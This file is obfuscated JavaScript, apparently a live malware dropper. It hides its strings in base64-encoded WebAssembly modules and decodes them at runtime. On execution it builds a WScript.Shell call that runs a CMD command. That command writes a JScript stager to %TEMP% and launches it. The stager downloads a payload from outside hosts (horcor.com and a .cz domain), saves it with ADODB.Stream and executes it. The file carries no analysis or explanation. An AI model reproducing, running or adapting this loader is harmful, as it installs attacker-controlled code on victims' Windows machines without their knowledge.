const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGlYCAgAAEfwBBAQt/AEEIC38AQTILfwBBOAsHqoCAgAAFBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwML35aAgAAEAEEBCwVldmFsAABBCAspbmV3JTIwQWN0aXZlWE9iamVjdCglMjJXU2NyaXB0LlNoZWxsJTIyKQAAQTILBFJ1bgAAQTgLlxZDTUQlMjAlMjAlMjAlMjAlMkZjJTIwZWNobyUyMGV2YWwodW5lc2NhcGUoV1NjcmlwdC5Bcmd1bWVudHMoMCkpKSUyMCUzRSUyMCUyNVRFTVAlMjUlNUM3Njc4Mjc4NS5UWFQlMjAlMjYlMjYlMjB0aW1lb3V0JTIwMyUyMCUyNiUyNiUyMHdzY3JpcHQlMjAlMkZFJTNBSlNjcmlwdCUyMCUyNVRFTVAlMjUlNUM3Njc4Mjc4NS5UWFQlMjAlMjIlMjUyOGZ1bmN0aW9uJTI1MjglMjUyOSUyNTdCJTI1M0JiZnNGTCUyNTNEJTI1MjAlMjUyODkxNjQ4JTI1MkMlMjUyMm5lJTI1MjIlMkIlMjUyMnclMjUyMEFjdGl2ZVhPYmplY3QlMjUyOCUyNTVDJTI1MjJBRE9EQi5TdHJlYW0lMjU1QyUyNTIyJTI1MjklMjUyMiUyNTI5JTI1M0JMUGRZc0VWJTI1M0QlMjUyMCUyNTI4NzY3MzglMjUyQyUyNTIyJTI1NUMlMjU1QyUyNTIyJTJCJTI1MjJ0bXAyMzUzOTkuOTQwJTI1MjIlMjUyOSUyNTNCbXRwUkN6JTI1M0QlMjUyMCUyNTI4Njg3MDMlMjUyQyUyNTIycmUlMjUyMiUyQiUyNTIyc3BvbnNlQm9keSUyNTIyJTI1MjklMjUzQnFiakxVJTI1M0QlMjUyMCUyNTI4ODY0NTclMjUyQyUyNTIyJTI1MjVUJTI1MjIlMkIlMjUyMkVNUCUyNTI1JTI1MjIlMjUyOSUyNTNCYllxY1dBaCUyNTNEJTI1MjAlMjUyODMxMTIlMjUyQyUyNTIyRXglMjUyMiUyQiUyNTIyZWMlMjUyMiUyNTI5JTI1M0JaemNGTm0lMjUzRCUyNTIwJTI1Mjg0NjgxOCUyNTJDJTI1MjJuZSUyNTIyJTJCJTI1MjJ3JTI1MjBBY3RpdmVYT2JqZWN0JTI1MjglMjU1QyUyNTIyV1NjcmlwdC5TaGVsbCUyNTVDJTI1MjIlMjUyOSUyNTIyJTI1MjklMjUzQnF1TExkZCUyNTNEJTI1MjAlMjUyODczODg1JTI1MkMlMjUyMnNlJTI1MjIlMkIlMjUyMm5kJTI1MjIlMjUyOSUyNTNCcHVoYSUyNTNEJTI1MjAlMjUyODk3NTI5JTI1MkMlMjUyMm5lJTI1MjIlMkIlMjUyMnclMjUyMEFjdGl2ZVhPYmplY3QlMjUyOCUyNTVDJTI1MjJNc3htbDIuU2VydmVyWE1MSFRUUCUyNTVDJTI1MjIlMjUyOSUyNTIyJTI1MjklMjUzQnhNd0pFJTI1M0QlMjUyMCUyNTI4NjUyNTMlMjUyQyUyNTIyaHQlMjUyMiUyQiUyNTIydHAlMjUzQSUyRiUyRmhvcmNvci5jb20lMkZlc2UudGYlMjUyMiUyNTI5JTI1M0JwTUdNTE4lMjUzRCUyNTIwJTI1MjgxNTkzNiUyNTJDJTI1MjJvcCUyNTIyJTJCJTI1MjJlbiUyNTIyJTI1MjklMjUzQlhHTFpxUGslMjUzRCUyNTIwJTI1Mjg3OTMyMiUyNTJDJTI1MjJodCUyNTIyJTJCJTI1MjJ0cCUyNTNBJTJGJTJGd3d3Lm5lbWNpY2VuYWRoYW5vdS5jeiUyRm52ZHRpbWUucHJzJTI1MjIlMjUyOSUyNTNCYUt3a2h2T2MlMjUzRCUyNTIwJTI1MjgxNjUxMSUyNTJDJTI1MjJzYSUyNTIyJTJCJTI1MjJ2ZVRvRmlsZSUyNTIyJTI1MjklMjUzQnJLc0RLJTI1M0QlMjUyMCUyNTI4NTc0OTclMjUyQyUyNTIyRXglMjUyMiUyQiUyNTIycGFuZEVudmlyb25tZW50U3RyaW5ncyUyNTIyJTI1MjklMjUzQktSR2trVmYlMjUzRCUyNTIwJTI1Mjg1MTAwNyUyNTJDJTI1MjJHRSUyNTIyJTJCJTI1MjJUJTI1MjIlMjUyOSUyNTNCZlVuZWRhZyUyNTNEJTI1MjAlMjUyODg4NzkzJTI1MkMlMjUyMldyJTI1MjIlMkIlMjUyMml0ZSUyNTIyJTI1MjklMjUzQnFheHN4TmRwJTI1M0QlMjUyMCUyNTI4NzAyOSUyNTJDJTI1MjJ0eSUyNTIyJTJCJTI1MjJwZSUyNTIyJTI1MjklMjUzQkdyY0VJYSUyNTNEJTI1MjAlMjUyODEzNDQ3JTI1MkMlMjUyMmV2JTI1MjIlMkIlMjUyMmFsJTI1MjIlMjUyOSUyNTNCUkxUc2JOT3YlMjUzRCUyNTIwJTI1MjgzMzE4MCUyNTJDdGhpcyUyNTVCR3JjRUlhJTI1NUQlMjUyOFp6Y0ZObSUyNTI5JTI1MjklMjUzQkVSdUxoZnlLJTI1M0QlMjUyMCUyNTI4Nzc4NTYlMjUyQ3RoaXMlMjU1QkdyY0VJYSUyNTVEJTI1MjhiZnNGTCUyNTI5JTI1MjklMjUzQldCZVhMdCUyNTNEJTI1MjAlMjUyODQ0MzcwJTI1MkN0aGlzJTI1NUJHcmNFSWElMjU1RCUyNTI4cHVoYSUyNTI5JTI1MjklMjUzQmVaeW5EJTI1M0QlMjUyMCUyNTI4Mjk2MTAlMjUyQ1JMVHNiTk92JTI1NUJyS3NESyUyNTVEJTI1MjhxYmpMVSUyNTI5JTJCTFBkWXNFViUyNTI5JTI1M0JFUnVMaGZ5SyUyNTVCcWF4c3hOZHAlMjU1RCUyNTNEJTI1MjAlMjUyODg4MjgzJTI1MkMxJTI1MjklMjUzQkVSdUxoZnlLJTI1NUJwTUdNTE4lMjU1RCUyNTI4JTI1MjklMjUzQnhRdUolMjUzRCUyNTIwJTI1Mjg2MjU4OCUyNTJDbnVsbCUyNTI5JTI1M0J0cnklMjU3QldCZVhMdCUyNTVCcE1HTUxOJTI1NUQlMjUyOEtSR2trVmYlMjUyQ3hNd0pFJTI1MkNmYWxzZSUyNTI5JTI1M0JXQmVYTHQlMjU1QnF1TExkZCUyNTVEJTI1MjglMjUyOSUyNTNCeFF1SiUyNTNEJTI1MjAlMjUyODkzODE0JTI1MkNXQmVYTHQlMjU1Qm10cFJDeiUyNTVEJTI1MjklMjUzQkVSdUxoZnlLJTI1NUJmVW5lZGFnJTI1NUQlMjUyOHhRdUolMjUyOSUyNTNCJTI1N0RjYXRjaCUyNTI4c055V1lhbyUyNTI5JTI1N0IlMjU3RGlmJTI1MjhudWxsJTI1M0QlMjUzRHhRdUolMjUyOSUyNTdCdHJ5JTI1N0JXQmVYTHQlMjU1QnBNR01MTiUyNTVEJTI1MjhLUkdra1ZmJTI1MkNYR0xacVBrJTI1MkNmYWxzZSUyNTI5JTI1M0JXQmVYTHQlMjU1QnF1TExkZCUyNTVEJTI1MjglMjUyOSUyNTNCeFF1SiUyNTNEJTI1MjAlMjUyODEzMjQ5JTI1MkNXQmVYTHQlMjU1Qm10cFJDeiUyNTVEJTI1MjklMjUzQkVSdUxoZnlLJTI1NUJmVW5lZGFnJTI1NUQlMjUyOHhRdUolMjUyOSUyNTNCJTI1N0RjYXRjaCUyNTI4aUlVdCUyNTI5JTI1N0IlMjU3RCUyNTdERVJ1TGhmeUslMjU1QmFLd2todk9jJTI1NUQlMjUyOGVaeW5EJTI1MkMyJTI1MjklMjUzQlJMVHNiTk92JTI1NUJiWXFjV0FoJTI1NUQlMjUyOGVaeW5EJTI1MjklMjUzQiUyNTdEJTI1MjklMjUyOCUyNTI5JTI1M0IlMjIA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                this[lS(0, 0)](lS(0, 1))[lS(0, 2)](lS(0, 3), 0);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();